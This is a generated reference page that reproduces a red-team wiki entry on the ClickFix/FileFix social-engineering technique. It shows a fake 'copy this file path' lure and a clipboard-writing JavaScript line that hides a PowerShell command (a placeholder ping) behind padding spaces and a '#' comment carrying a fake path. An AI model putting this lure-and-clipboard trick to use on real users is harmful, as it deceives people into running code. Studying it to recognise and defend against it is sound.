---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# ClickFix

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-redteam-access-clickfix` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/access/clickfix.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

ClickFix is a social engineering attack that prompts users to unknowingly execute malicious code, usually through the Run Dialog (Windows Key + R).

## Preserved Body

````markdown
> ClickFix is a social engineering attack that prompts users to unknowingly execute malicious code, usually through the Run Dialog (`Windows Key + R`).

## FileFix

Display a message to the user to lure him into copying and pasting a command in a shell or equivalent (File Explorer).

```ps1
To access the file, follow these steps:
1. Copy the file path below:
   `C:\company\internal-secure\filedrive\HRPolicy.docx`
2. Open File Explorer and select the address bar (CTRL + L)
3. Paste the file path and press Enter
```

When the user clicks on the "COPY" button, it should set the content of his clipboard to the following.

```ps1
navigator.clipboard.writeText("powershell.exe -c ping example.com                                                                                                                # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx                                                                    ");
```

Here, a few tricks have been added to improve the efficiency of the payload:

* Multiple spaces to hide the start of the payload
* A comment with `#` containing a fake path to the document

Executable files (e.g. .exe) executed through the File Explorer’s address bar have their Mark of The Web (MOTW) attribute removed.

## References

* [FileFix - A ClickFix Alternative - mrd0x - June 23, 2025](https://mrd0x.com/filefix-clickfix-alternative/)
* [FileFix (Part 2) - mrd0x - June 30, 2025](https://mrd0x.com/filefix-part-2/)
````

## Source Verification

[source record](../../sources/internalallthethings/clickfix.md)

## Evidence Excerpt

````text
_body: "# ClickFix\n\n> ClickFix is a social engineering attack that prompts users to unknowingly execute malicious code,\
\ usually through the Run Dialog (`Windows Key + R`).\n\n## FileFix\n\nDisplay a message to the user to lure him into copying\
\ and pasting a command in a shell or equivalent (File Explorer).\n\n```ps1\nTo access the file, follow these steps:\n1.\
\ Copy the file path below:\n   `C:\\company\\internal-secure\\filedrive\\HRPolicy.docx`\n2. Open File Explorer and select\
\ the address bar (CTRL + L)\n3. Paste the file path and press Enter\n```\n\nWhen the user clicks on the \"COPY\" button,\
\ it should set the content of his clipboard to the following.\n\n```ps1\nnavigator.clipboard.writeText(\"powershell.exe\
\ -c ping example.com                                                                                                  \
\              # C:\\\\company\\\\internal-secure\\\\filedrive\\\\HRPolicy.docx                                        \
````
